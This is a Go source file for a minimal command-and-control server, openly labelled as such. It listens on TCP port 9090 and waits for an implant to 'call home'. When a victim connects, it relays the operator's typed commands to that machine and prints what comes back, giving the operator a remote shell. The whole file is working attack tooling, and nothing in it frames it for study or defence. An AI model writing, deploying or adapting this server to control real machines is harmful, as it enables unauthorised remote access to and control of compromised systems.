package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

func main() {
	port := "9090"
	listener, err := net.Listen("tcp", ":"+port)
	if err != nil {
		fmt.Printf("Error starting listener: %v\n", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Printf("[*] C2 Server listening on port %s...\n", port)
	fmt.Println("[*] Waiting for implant to call home...")

	conn, err := listener.Accept()
	if err != nil {
		fmt.Printf("Error accepting connection: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	fmt.Printf("\n[+] VICTIM CONNECTED: %s\n", conn.RemoteAddr().String())
	fmt.Println("[+] You have a shell. Type commands below.")
	fmt.Println("------------------------------------------")

	reader := bufio.NewReader(os.Stdin)
	implantReader := bufio.NewReader(conn)

	for {
		fmt.Print("C2# ")
		cmd, _ := reader.ReadString('\n')
		conn.Write([]byte(cmd))
		if strings.TrimSpace(cmd) == "exit" {
			fmt.Println("Closing connection")
			break
		}
		buffer := make([]byte, 4096)
		n, err := implantReader.Read(buffer)
		if err != nil {
			fmt.Println("[-] Victim disconnected")
			break
		}
		fmt.Print(string(buffer[:n]))
	}
}
